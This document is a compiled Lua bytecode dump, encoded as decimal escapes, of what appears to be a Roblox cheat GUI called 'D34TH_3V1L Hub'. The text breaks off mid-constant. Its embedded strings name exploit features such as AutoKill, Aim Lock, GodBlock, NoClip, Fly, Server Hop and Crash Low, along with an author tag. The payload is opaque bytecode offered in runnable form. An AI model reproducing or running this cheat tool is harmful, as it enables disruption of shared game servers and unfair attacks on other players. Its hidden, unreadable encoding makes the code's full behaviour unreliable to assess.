220\153\0\2\201\216\25\142\193\25\24\0\201\216\25\144\197\217\8\0\198\217\194\51\1\90\81\0\65\90\6\0\129\154\81\0\193\90\6\0\220\153\128\2\201\216\25\145\197\217\8\0\198\217\194\51\1\90\6\0\65\218\14\0\129\90\6\0\193\218\81\0\220\153\128\2\201\216\25\147\197\89\17\0\198\25\209\51\198\217\216\51\201\216\25\162\193\25\82\0\201\216\153\163\197\217\5\0\198\25\198\51\1\90\25\0\65\90\25\0\129\90\25\0\220\153\0\2\201\216\25\164\193\153\25\0\201\216\25\165\228\217\2\0\0\0\0\7\5\90\82\0\65\154\82\0\6\90\26\52\64\26\128\51\28\154\0\1\28\90\128\0\36\26\3\0\0\0\0\13\69\90\82\0\129\154\82\0\70\154\154\52\128\26\0\52\92\154\0\1\92\90\128\0\100\90\3\0\0\0\128\13\133\90\82\0\193\154\82\0\134\218\26\53\192\26\128\52\156\154\0\1\156\90\128\0\164\154\3\0\0\0\0\14\197\90\82\0\1\155\82\0\198\26\155\53\0\27\0\53\220\154\0\1\220\90\128\0\228\218\3\0\0\0\0\15\5\91\82\0\65\155\82\0\6\91\27\54\64\27\128\53\28\155\0\1\28\91\128\0\36\27\4\0\0\0\128\15\69\91\82\0\129\155\82\0\70\155\155\54\128\27\0\54\92\155\0\1\92\91\128\0\100\91\4\0\0\0\0\16\133\91\82\0\193\155\82\0\134\219\27\55\192\27\128\54\156\155\0\1\156\91\128\0\164\155\4\0\0\0\128\16\197\91\82\0\1\156\82\0\198\27\156\55\0\28\0\55\220\155\0\1\220\91\128\0\228\219\4\0\0\0\0\17\5\92\82\0\65\156\82\0\6\92\28\56\64\28\128\55\28\156\0\1\28\92\128\0\36\28\5\0\0\0\128\17\69\92\82\0\129\156\82\0\70\156\156\56\128\28\0\56\92\156\0\1\92\92\128\0\100\92\5\0\0\0\0\18\133\92\82\0\193\156\82\0\134\220\28\57\192\28\128\56\156\156\0\1\156\92\128\0\164\156\5\0\0\0\128\18\197\92\82\0\1\157\82\0\198\28\157\57\0\29\0\57\220\156\0\1\220\92\128\0\228\220\5\0\0\0\0\19\5\93\82\0\65\157\82\0\6\93\29\58\64\29\128\57\28\157\0\1\28\93\128\0\36\29\6\0\0\0\128\19\69\93\82\0\129\157\82\0\70\157\157\58\128\29\0\58\92\157\0\1\92\93\128\0\100\93\6\0\0\0\0\20\133\93\82\0\193\157\82\0\134\221\29\59\192\29\128\58\156\157\0\1\156\93\128\0\164\157\6\0\0\0\128\20\197\93\82\0\1\158\82\0\198\29\158\59\0\30\0\59\220\157\0\1\220\93\128\0\228\221\6\0\0\0\128\21\5\94\82\0\65\158\82\0\6\94\30\60\64\30\128\59\28\158\0\1\28\94\128\0\36\30\7\0\0\0\0\22\69\94\82\0\129\158\82\0\70\158\158\60\128\30\0\60\92\158\0\1\92\94\128\0\100\94\7\0\0\0\128\22\133\94\82\0\193\158\82\0\134\222\30\61\192\30\128\60\156\158\0\1\156\94\128\0\164\158\7\0\0\0\0\23\197\94\82\0\1\159\82\0\198\30\159\61\0\31\0\61\220\158\0\1\220\94\128\0\228\222\7\0\0\0\128\23\0\0\0\0\0\0\0\4\5\95\82\0\65\159\82\0\6\95\31\62\64\31\128\61\28\159\0\1\28\95\128\0\36\31\8\0\0\0\0\24\69\95\82\0\129\159\82\0\70\159\159\62\128\31\0\62\92\159\0\1\92\95\128\0\100\95\8\0\0\0\128\25\133\95\82\0\193\159\82\0\134\223\31\63\192\31\128\62\156\159\0\1\156\95\128\0\164\159\8\0\0\0\0\26\197\95\82\0\1\160\82\0\198\31\160\63\0\32\0\63\220\159\0\1\220\95\128\0\228\223\8\0\0\0\0\27\5\96\82\0\65\160\82\0\6\96\32\64\64\32\128\63\28\160\0\1\28\96\128\0\36\32\9\0\0\0\0\28\69\96\82\0\129\160\82\0\70\160\160\64\128\32\0\64\92\160\0\1\92\96\128\0\100\96\9\0\0\0\128\28\133\96\82\0\193\160\82\0\134\224\32\65\192\32\128\64\156\160\0\1\156\96\128\0\164\160\9\0\0\0\0\29\197\96\82\0\1\161\82\0\198\32\161\65\0\33\0\65\220\160\0\1\220\96\128\0\228\224\9\0\0\0\0\30\5\97\82\0\65\161\82\0\6\97\33\66\64\33\128\65\28\161\0\1\28\97\128\0\36\33\10\0\0\0\128\30\69\97\82\0\129\161\82\0\70\161\161\66\128\33\0\66\92\161\0\1\92\97\128\0\100\97\10\0\0\0\128\5\133\97\82\0\193\161\82\0\134\225\33\67\192\33\128\66\156\161\0\1\156\97\128\0\164\161\10\0\0\0\0\32\197\97\82\0\1\162\82\0\198\33\162\67\0\34\0\67\220\161\0\1\220\97\128\0\228\225\10\0\0\0\0\33\5\98\82\0\65\162\82\0\6\98\34\68\64\34\128\67\28\162\0\1\28\98\128\0\36\34\11\0\0\0\0\34\69\98\82\0\129\162\82\0\70\162\162\68\128\34\0\68\92\162\0\1\92\98\128\0\100\98\11\0\0\0\0\35\133\98\82\0\193\162\82\0\134\226\34\69\192\34\128\68\156\162\0\1\156\98\128\0\164\162\11\0\0\0\0\36\197\98\82\0\1\163\82\0\198\34\163\69\0\35\0\69\220\162\0\1\220\98\128\0\228\226\11\0\0\0\0\37\5\99\82\0\65\163\82\0\6\99\35\70\64\35\128\69\28\163\0\1\28\99\128\0\36\35\12\0\0\0\128\38\69\99\82\0\129\163\82\0\70\163\163\70\128\35\0\70\92\163\0\1\92\99\128\0\100\99\12\0\0\0\0\39\133\99\82\0\193\163\82\0\134\227\35\71\192\35\128\70\156\163\0\1\156\99\128\0\164\163\12\0\0\0\128\39\197\99\82\0\1\164\82\0\198\35\164\71\0\36\0\71\220\163\0\1\220\99\128\0\228\227\12\0\0\0\0\40\5\100\82\0\65\164\82\0\6\100\36\72\64\36\128\71\28\164\0\1\28\100\128\0\36\36\13\0\0\0\128\40\69\100\82\0\129\164\82\0\70\164\164\72\128\36\0\72\92\164\0\1\92\100\128\0\100\100\13\0\0\0\128\41\133\100\82\0\193\164\82\0\134\228\36\73\192\36\128\72\156\164\0\1\156\100\128\0\164\164\13\0\0\0\0\42\197\100\82\0\1\165\82\0\198\36\165\73\0\37\0\73\220\164\0\1\220\100\128\0\228\228\13\0\0\0\128\43\5\101\82\0\65\165\82\0\6\101\37\74\64\37\128\73\28\165\0\1\28\101\128\0\36\37\14\0\0\0\0\48\69\101\82\0\129\165\82\0\70\165\165\74\128\37\0\74\92\165\0\1\92\101\128\0\100\101\14\0\0\0\0\47\0\0\0\48\133\101\82\0\193\165\82\0\134\229\37\75\192\37\128\74\156\165\0\1\156\101\128\0\164\165\14\0\0\0\0\12\0\0\0\7\135\229\82\0\164\229\14\0\0\0\0\12\0\0\128\4\135\37\83\0\133\37\83\0\156\101\128\0\30\0\128\0\77\1\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\7\0\0\0\115\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\15\0\0\0\67\104\97\114\97\99\116\101\114\65\100\100\101\100\0\4\8\0\0\0\67\111\110\110\101\99\116\0\4\2\0\0\0\101\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\10\0\0\0\83\99\114\101\101\110\71\117\105\0\4\6\0\0\0\70\114\97\109\101\0\4\11\0\0\0\73\109\97\103\101\76\97\98\101\108\0\4\11\0\0\0\84\101\120\116\66\117\116\116\111\110\0\4\8\0\0\0\84\101\120\116\66\111\120\0\4\10\0\0\0\84\101\120\116\76\97\98\101\108\0\4\15\0\0\0\83\99\114\111\108\108\105\110\103\70\114\97\109\101\0\4\8\0\0\0\67\111\114\101\71\117\105\0\4\5\0\0\0\78\97\109\101\0\4\5\0\0\0\68\69\84\72\0\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\0\0\0\4\23\0\0\0\66\97\99\107\103\114\111\117\110\100\84\114\97\110\115\112\97\114\101\110\99\121\0\3\51\51\51\51\51\51\211\63\4\13\0\0\0\66\111\114\100\101\114\67\111\108\111\114\51\0\3\0\0\0\0\0\0\59\64\3\0\0\0\0\0\0\69\64\3\0\0\0\0\0\128\74\64\4\16\0\0\0\66\111\114\100\101\114\83\105\122\101\80\105\120\101\108\0\3\0\0\0\0\0\0\16\64\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\6\0\0\0\85\68\105\109\50\0\3\193\108\200\96\65\49\196\63\3\46\149\165\64\224\45\199\63\4\5\0\0\0\83\105\122\101\0\3\0\0\0\0\0\152\130\64\3\0\0\0\0\0\64\118\64\4\5\0\0\0\82\97\121\97\0\3\0\0\0\0\0\64\101\64\3\100\141\58\255\221\151\157\63\3\64\240\248\63\206\87\184\63\3\0\0\0\0\0\128\129\64\3\0\0\0\0\0\0\24\64\4\12\0\0\0\84\97\114\103\101\116\70\114\97\109\101\0\3\0\0\0\0\0\0\224\63\3\236\133\101\224\62\26\209\63\3\164\90\126\191\28\230\192\63\3\0\0\0\0\0\32\122\64\3\0\0\0\0\0\48\114\64\4\8\0\0\0\86\105\115\105\98\108\101\0\1\0\4\12\0\0\0\84\97\114\103\101\116\73\109\97\103\101\0\3\0\0\0\0\0\0\52\64\3\150\101\51\63\170\101\157\63\3\211\38\183\63\49\152\161\63\3\0\0\0\0\0\192\107\64\3\0\0\0\0\0\64\104\64\4\6\0\0\0\73\109\97\103\101\0\4\47\0\0\0\114\98\120\97\115\115\101\116\58\47\47\116\101\120\116\117\114\101\115\47\117\105\47\71\117\105\73\109\97\103\101\80\108\97\99\101\104\111\108\100\101\114\46\112\110\103\0\4\5\0\0\0\86\105\101\119\0\3\142\122\227\255\233\113\227\63\3\5\193\75\191\48\152\193\63\3\0\0\0\0\0\128\94\64\3\0\0\0\0\0\128\66\64\4\5\0\0\0\70\111\110\116\0\4\5\0\0\0\69\110\117\109\0\4\11\0\0\0\70\114\101\100\111\107\97\79\110\101\0\4\5\0\0\0\84\101\120\116\0\4\11\0\0\0\84\101\120\116\67\111\108\111\114\51\0\3\0\0\0\0\0\96\102\64\4\9\0\0\0\84\101\120\116\83\105\122\101\0\3\0\0\0\0\0\0\60\64\4\15\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\85\112\0\4\5\0\0\0\71\111\84\111\0\3\236\245\9\192\1\29\133\63\4\5\0\0\0\71\111\116\111\0\4\9\0\0\0\65\117\116\111\75\105\108\108\0\3\30\136\77\224\173\126\208\63\4\4\0\0\0\66\97\103\0\3\253\201\26\32\145\105\216\63\4\6\0\0\0\70\108\105\110\103\0\3\171\133\219\159\96\70\224\63\4\9\0\0\0\82\80\71\32\76\111\99\107\0\3\212\39\251\223\248\87\228\63\4\13\0\0\0\71\114\101\110\97\100\101\32\76\111\99\107\0\3\154\41\216\63\130\164\231\63\4\5\0\0\0\76\111\99\107\0\3\123\143\20\64\26\182\235\63\4\7\0\0\0\84\97\114\103\101\116\0\4\5\0\0\0\73\110\102\111\0\3\112\117\193\95\26\182\235\63\4\14\0\0\0\84\97\114\103\101\116\84\101\120\116\98\111\120\0\3\0\0\0\0\0\0\0\64\3\255\150\190\223\129\164\231\63\3\0\0\0\0\0\0\58\64\4\8\0\0\0\67\97\114\116\111\111\110\0\4\12\0\0\0\84\97\114\103\101\116\32\72\101\114\101\0\3\0\0\0\0\0\64\86\64\3\0\0\0\0\0\0\68\64\4\10\0\0\0\77\97\105\110\70\114\97\109\101\0\4\10\0\0\0\70\108\121\83\112\101\101\100\45\0\3\199\9\102\32\28\153\163\63\3\24\239\209\95\11\241\234\63\4\4\0\0\0\70\108\121\0\3\37\217\9\128\8\169\214\63\4\10\0\0\0\70\108\121\83\112\101\101\100\43\0\3\70\64\242\191\118\111\229\63\4\10\0\0\0\82\97\121\97\70\114\97\109\101\0\3\0\0\0\0\0\96\96\64\3\85\80\10\32\160\46\233\63\3\0\0\0\0\0\32\120\64\3\0\0\0\0\0\0\32\64\4\9\0\0\0\71\111\100\66\108\111\99\107\0\3\87\219\198\255\26\153\163\63\3\79\201\17\160\154\90\163\63\4\10\0\0\0\71\111\100\66\117\108\108\101\116\0\3\210\130\211\95\8\169\214\63\4\6\0\0\0\82\101\97\99\104\0\4\9\0\0\0\70\114\101\101\70\105\115\116\0\3\137\232\15\129\174\243\201\63\4\12\0\0\0\70\114\101\101\70\105\115\116\91\81\93\0\4\9\0\0\0\78\111\82\101\99\111\105\108\0\4\10\0\0\0\78\111\32\82\101\99\111\105\108\0\4\10\0\0\0\65\110\111\110\121\109\111\117\115\0\4\10\0\0\0\83\116\111\112\32\65\110\105\109\0\3\159\152\57\128\37\167\214\63\4\5\0\0\0\77\97\115\107\0\3\44\150\199\63\216\110\214\63\4\14\0\0\0\73\110\118\105\115\105\98\108\101\77\97\115\107\0\3\154\150\40\224\118\111\229\63\3\0\0\0\0\0\0\56\64\4\9\0\0\0\65\110\116\105\71\114\97\98\0\3\244\191\193\255\27\153\163\63\3\101\196\48\32\174\126\224\63\4\13\0\0\0\73\110\102\105\110\105\116\101\90\111\111\109\0\4\9\0\0\0\73\110\102\32\90\111\111\109\0\4\11\0\0\0\83\117\112\101\114\72\117\109\97\110\0\4\15\0\0\0\83\117\112\101\114\72\117\109\97\110\32\91\90\93\0\3\0\0\0\0\0\0\46\64\4\9\0\0\0\70\117\110\70\114\97\109\101\0\4\10\0\0\0\72\105\103\104\45\84\111\111\108\0\3\13\152\75\160\68\72\213\63\3\241\151\48\0\47\152\161\63\4\9\0\0\0\66\105\107\101\45\70\108\121\0\3\9\98\59\64\121\13\229\63\4\12\0\0\0\82\80\71\45\67\111\110\116\114\111\108\0\3\244\191\193\255\27\153\147\63\3\85\162\117\31\67\49\200\63\4\9\0\0\0\83\112\101\101\100\82\80\71\0\4\10\0\0\0\83\112\101\101\100\45\82\112\103\0\3\0\0\0\0\0\0\50\64\4\11\0\0\0\76\111\99\107\45\84\111\111\108\115\0\4\8\0\0\0\86\111\108\97\100\111\114\0\3\209\199\251\191\138\54\214\63\4\12\0\0\0\80\72\89\83\73\67\83\32\71\85\78\0\3\0\0\0\0\0\160\102\64\3\0\0\0\0\0\0\240\63\3\115\180\253\255\133\75\176\63\3\170\105\148\191\205\179\145\63\3\0\0\0\0\0\216\128\64\3\0\0\0\0\0\0\53\64\4\16\0\0\0\80\101\114\109\97\110\101\110\116\77\97\114\107\101\114\0\4\15\0\0\0\68\51\52\84\72\95\51\86\49\76\32\72\117\98\0\3\0\0\0\0\0\0\98\64\3\0\0\0\0\0\0\66\64\4\11\0\0\0\69\120\116\114\97\70\114\97\109\101\0\3\0\0\0\0\0\128\65\64\4\8\0\0\0\65\105\109\76\111\99\107\0\3\90\178\16\0\136\242\154\63\3\74\162\100\96\135\171\159\63\4\9\0\0\0\67\114\97\115\104\76\111\119\0\3\121\47\64\160\8\169\214\63\4\10\0\0\0\67\114\97\115\104\32\76\111\119\0\3\0\0\0\0\0\0\48\64\4\11\0\0\0\83\111\117\114\99\101\83\97\110\115\0\4\5\0\0\0\71\83\50\49\0\3\0\0\0\0\0\160\107\64\3\0\0\0\0\0\0\44\64\4\10\0\0\0\67\114\97\115\104\83\119\97\103\0\3\157\204\56\64\66\170\229\63\4\6\0\0\0\67\114\97\115\104\0\4\9\0\0\0\83\119\97\103\77\111\100\101\0\4\7\0\0\0\82\101\106\111\105\110\0\3\205\68\252\255\139\242\154\63\3\232\209\135\64\139\171\207\63\4\10\0\0\0\83\101\114\118\101\114\72\111\112\0\3\51\109\70\160\214\129\214\63\4\11\0\0\0\83\101\114\118\101\114\32\72\111\112\0\4\11\0\0\0\83\101\108\108\101\114\84\111\111\108\0\3\8\202\0\95\240\58\207\63\4\15\0\0\0\83\111\117\114\99\101\83\97\110\115\66\111\108\100\0\4\9\0\0\0\82\97\121\67\111\100\101\120\0\4\10\0\0\0\65\110\116\105\70\108\105\110\103\0\3\197\242\124\64\127\69\219\63\4\7\0\0\0\78\111\67\108\105\112\0\3\97\251\153\223\8\169\214\63\3\155\59\80\96\103\238\219\63\4\12\0\0\0\78\111\45\67\108\105\112\32\91\107\93\0\4\11\0\0\0\70\111\114\99\101\82\101\115\101\116\0\3\42\203\21\128\116\209\229\63\3\205\82\239\255\156\207\220\63\4\13\0\0\0\84\111\103\103\108\101\115\70\114\97\109\101\0\4\8\0\0\0\65\110\116\105\66\97\103\0\4\11\0\0\0\65\110\116\105\66\97\103\76\117\122\0\3\0\0\0\0\0\224\111\64\4\9\0\0\0\65\110\116\105\83\108\111\119\0\3\237\22\78\192\25\182\203\63\4\12\0\0\0\65\110\116\105\83\108\111\119\76\117\122\0\4\10\0\0\0\65\110\116\105\83\116\111\109\112\0\4\13\0\0\0\65\110\116\105\83\116\111\109\112\76\117\122\0\4\10\0\0\0\65\117\116\111\66\108\111\99\107\0\4\13\0\0\0\65\117\116\111\66\108\111\99\107\76\117\122\0\4\9\0\0\0\65\117\116\111\68\114\111\112\0\3\191\173\53\64\219\189\229\63\4\12\0\0\0\65\117\116\111\68\114\111\112\76\117\122\0\4\9\0\0\0\67\97\115\104\65\117\114\97\0\4\12\0\0\0\67\97\115\104\65\117\114\97\76\117\122\0\4\7\0\0\0\65\99\116\105\118\101\0\1\1\3\0\0\0\0\0\0\61\64\3\172\1\73\30\104\250\142\63\3\0\0\0\0\0\192\114\64\4\12\0\0\0\69\120\116\114\97\66\117\116\116\111\110\0\3\0\0\0\0\0\0\76\64\3\50\59\66\191\211\65\157\63\3\233\122\104\64\57\193\211\63\3\0\0\0\0\0\128\96\64\4\6\0\0\0\69\120\116\114\97\0\4\10\0\0\0\70\117\110\66\117\116\116\111\110\0\3\215\206\138\0\212\65\157\63\3\32\250\65\159\192\226\201\63\4\4\0\0\0\70\117\110\0\4\11\0\0\0\77\97\105\110\66\117\116\116\111\110\0\3\172\74\119\31\212\65\157\63\3\161\18\248\63\151\91\185\63\4\5\0\0\0\77\97\105\110\0\4\13\0\0\0\84\97\114\103\101\116\66\117\116\116\111\110\0\3\238\96\26\63\186\60\195\63\4\14\0\0\0\84\111\103\103\108\101\115\66\117\116\116\111\110\0\3\127\148\27\64\212\65\157\63\3\32\236\48\0\54\123\208\63\4\8\0\0\0\84\111\103\103\108\101\115\0\3\135\7\94\127\227\138\155\63\3\150\243\40\192\39\2\177\63\3\0\0\0\0\0\0\95\64\4\13\0\0\0\72\101\97\108\116\104\66\117\116\116\111\110\0\3\129\229\57\192\34\47\162\63\3\245\161\168\191\160\253\214\63\4\7\0\0\0\72\101\97\116\108\104\0\4\11\0\0\0\72\111\109\101\66\117\116\116\111\110\0\3\97\174\129\0\164\117\152\63\4\5\0\0\0\72\111\109\101\0\4\4\0\0\0\72\111\109\0\4\8\0\0\0\87\101\108\99\111\109\101\0\3\0\0\0\0\0\0\72\64\3\114\235\39\128\63\12\166\191\3\217\164\120\159\222\161\152\63\3\0\0\0\0\0\224\109\64\3\0\0\0\0\0\128\64\64\4\13\0\0\0\83\112\101\99\105\97\108\69\108\105\116\101\0\4\11\0\0\0\66\105\101\110\118\101\110\105\100\111\0\3\0\0\0\0\0\0\92\64\3\0\0\0\0\0\0\62\64\4\13\0\0\0\80\108\97\121\101\114\32\73\109\97\103\101\0\3\0\0\0\0\0\0\20\64\3\82\26\37\64\49\152\193\63\3\0\0\0\0\0\224\108\64\3\0\0\0\0\0\96\103\64\4\8\0\0\0\86\101\114\115\105\111\110\0\3\59\249\123\128\170\101\157\63\3\237\103\235\191\82\246\232\63\3\0\0\0\0\0\0\105\64\3\0\0\0\0\0\0\73\64\4\14\0\0\0\86\101\114\115\105\111\110\32\49\46\49\46\48\0\3\0\0\0\0\0\64\92\64\4\17\0\0\0\84\101\120\116\83\116\114\111\107\101\67\111\108\111\114\51\0\4\11\0\0\0\85\112\100\97\116\101\32\76\111\103\0\3\152\26\34\32\191\36\226\63\3\97\34\115\159\251\182\192\63\3\0\0\0\0\0\96\101\64\4\11\0\0\0\70\111\110\100\97\109\101\110\116\111\0\4\10\0\0\0\82\97\121\97\32\72\111\109\101\0\3\180\145\240\95\78\192\227\63\3\168\121\16\0\241\58\207\63\3\0\0\0\0\0\128\97\64\3\0\0\0\0\0\0\28\64\3\154\148\54\224\233\113\227\63\3\1\104\29\32\91\96\212\63\3\0\0\0\0\0\128\98\64\4\12\0\0\0\80\97\116\114\105\99\107\72\97\110\100\0\4\17\0\0\0\42\32\65\110\111\121\109\111\117\115\32\70\105\120\101\100\0\3\0\0\0\0\0\0\102\64\4\11\0\0\0\84\101\120\116\83\99\97\108\101\100\0\4\12\0\0\0\84\101\120\116\87\114\97\112\112\101\100\0\3\119\181\129\224\150\116\215\63\3\0\0\0\0\0\128\69\64\4\20\0\0\0\43\32\32\78\101\119\32\65\105\109\76\111\99\107\32\91\111\112\93\0\3\84\148\57\0\92\213\221\63\4\13\0\0\0\43\32\65\117\116\111\72\101\97\108\116\104\0\4\12\0\0\0\72\101\97\116\108\104\70\114\97\109\101\0\3\236\109\90\1\170\101\141\191\4\12\0\0\0\65\117\116\111\32\72\101\97\108\116\104\0\3\0\0\0\0\0\32\102\64\4\17\0\0\0\65\117\116\111\72\101\97\108\116\104\66\117\116\116\111\110\0\3\249\149\209\63\246\135\225\63\3\64\61\189\31\165\236\225\63\3\0\0\0\0\0\192\100\64\4\11\0\0\0\65\117\116\111\72\101\97\108\116\104\0\4\12\0\0\0\72\101\97\108\116\104\84\101\120\116\111\0\3\218\142\243\255\173\210\180\191\3\0\21\13\160\127\69\235\63\4\7\0\0\0\72\101\97\108\116\104\0\4\11\0\0\0\72\101\97\108\116\86\97\108\117\101\0\4\12\0\0\0\76\97\121\111\117\116\79\114\100\101\114\0\3\0\0\0\0\0\0\20\192\3\14\37\121\255\54\99\223\63\3\4\69\198\127\142\10\236\63\3\0\0\0\0\0\96\99\64\4\2\0\0\0\76\0\3\0\0\0\0\0\128\70\64\4\14\0\0\0\72\101\97\108\116\104\84\101\120\116\66\111\120\0\3\254\182\214\0\109\247\198\63\3\157\206\171\192\228\212\202\63\3\0\0\0\0\0\0\71\64\4\12\0\0\0\72\101\97\108\116\104\32\72\101\114\101\0\4\10\0\0\0\99\111\114\111\117\116\105\110\101\0\4\5\0\0\0\119\114\97\112\0\4\14\0\0\0\83\101\116\80\108\97\121\101\114\73\110\102\111\0\4\11\0\0\0\83\104\114\105\110\107\78\97\109\101\0\60\0\0\0\0\0\0\0\19\0\0\0\22\0\0\0\0\1\0\4\11\0\0\0\69\0\0\0\92\64\128\0\75\64\64\0\193\128\0\0\92\128\128\1\90\0\0\0\22\0\254\127\69\192\0\0\128\0\0\0\92\64\0\1\30\0\128\0\4\0\0\0\4\5\0\0\0\119\97\105\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\18\0\0\0\70\85\76\76\89\95\76\79\65\68\69\68\95\67\72\65\82\0\4\2\0\0\0\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\24\0\0\0\33\0\0\0\0\1\0\9\21\0\0\0\69\0\0\0\129\64\0\0\92\64\0\1\69\0\0\0\129\128\0\0\92\64\0\1\69\192\0\0\139\0\65\0\156\0\0\1\92\0\1\0\22\128\1\128\139\65\193\2\1\130\1\0\156\129\128\1\154\1\0\0\22\64\0\128\139\193\193\2\156\65\0\1\97\128\0\0\22\128\253\127\30\0\128\0\8\0\0\0\4\6\0\0\0\112\114\105\110\116\0\4\39\0\0\0\83\116\111\112\32\101\120\112\108\111\105\116\105\110\103\32\98\111\121\32\121\111\117\32\114\117\105\110\32\116\104\101\32\103\97\109\101\115\0\4\24\0\0\0\77\97\100\101\32\66\121\32\68\51\52\84\72\95\51\86\49\76\35\48\48\50\53\0\4\6\0\0\0\112\97\105\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\8\0\0\0\68\101\115\116\114\111\121\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\177\0\0\0\187\0\0\0\3\0\0\4\48\0\0\0\4\0\0\0\23\0\64\0\22\128\5\128\4\0\128\0\9\128\192\128\2\0\128\0\8\0\0\0\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\11\128\65\0\129\192\1\0\28\128\128\1\69\192\0\0\75\0\193\0\193\64\2\0\92\128\128\1\132\0\0\1\70\128\128\0\70\128\194\0\75\192\194\0\193\0\3\0\92\128\128\1\9\64\0\132\22\0\5\128\4\0\128\0\9\64\195\128\2\0\0\0\8\0\0\0\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\11\128\65\0\129\192\1\0\28\128\128\1\69\192\0\0\75\0\193\0\193\64\2\0\92\128\128\1\70\128\195\0\70\128\194\0\75\192\194\0\193\0\3\0\92\128\128\1\9\64\0\132\30\0\128\0\15\0\0\0\1\0\4\5\0\0\0\84\101\120\116\0\4\7\0\0\0\85\110\86\105\101\119\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\7\0\0\0\67\97\109\101\114\97\0\4\14\0\0\0\67\97\109\101\114\97\83\117\98\106\101\99\116\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\22\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\5\0\0\0\86\105\101\119\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\199\0\0\0\202\0\0\0\2\0\0\7\22\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\69\128\0\0\70\192\192\0\133\0\1\0\134\64\65\1\196\0\128\0\134\192\0\1\134\0\64\1\134\128\65\1\134\192\65\1\197\0\2\0\198\192\192\1\1\65\2\0\65\65\2\0\129\65\2\0\220\128\0\2\140\192\0\1\92\128\0\1\9\64\0\129\30\0\128\0\10\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\8\0\0\0\86\101\99\116\111\114\51\0\3\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\213\0\0\0\36\1\0\0\6\0\0\5\100\0\0\0\4\0\0\0\23\0\64\0\22\128\14\128\4\0\128\0\9\128\192\128\2\0\128\0\8\0\0\0\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\6\128\65\0\8\0\0\1\4\0\0\1\6\0\66\0\11\64\66\0\129\128\2\0\28\128\128\1\6\192\66\0\6\0\67\0\7\192\1\0\4\0\0\1\6\0\66\0\11\64\66\0\129\128\2\0\28\128\128\1\6\192\66\0\6\128\67\0\7\64\3\0\4\0\0\1\6\0\66\0\11\64\66\0\129\128\2\0\28\128\128\1\6\192\66\0\6\0\68\0\7\192\3\0\5\64\4\0\65\128\4\0\28\64\0\1\5\192\0\0\11\0\65\0\129\192\4\0\28\128\128\1\11\0\69\0\129\64\5\0\193\128\5\0\36\1\0\0\4\0\128\1\28\64\128\2\5\192\0\0\11\0\65\0\129\192\4\0\28\128\128\1\11\0\69\0\129\192\5\0\193\128\5\0\36\65\0\0\4\0\0\2\4\0\128\2\28\64\128\2\22\0\9\128\4\0\128\0\9\0\198\128\2\0\0\0\8\0\0\0\5\64\6\0\65\128\6\0\28\64\0\1\5\192\0\0\11\0\65\0\129\192\4\0\28\128\128\1\11\192\70\0\129\64\5\0\28\64\128\1\5\192\0\0\11\0\65\0\129\192\4\0\28\128\128\1\11\192\70\0\129\192\5\0\28\64\128\1\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\6\128\65\0\8\0\0\1\4\0\0\1\6\0\66\0\6\128\66\0\69\192\2\0\70\0\199\0\133\192\1\0\197\64\3\0\5\193\3\0\92\128\0\2\9\64\128\133\30\0\128\0\29\0\0\0\1\0\4\5\0\0\0\84\101\120\116\0\4\11\0\0\0\85\110\65\117\116\111\75\105\108\108\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\4\0\0\0\65\88\49\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\2\0\0\0\88\0\4\4\0\0\0\65\89\49\0\4\2\0\0\0\89\0\4\4\0\0\0\65\90\49\0\4\2\0\0\0\90\0\4\5\0\0\0\119\97\105\116\0\3\0\0\0\0\0\0\224\63\4\11\0\0\0\82\117\110\83\101\114\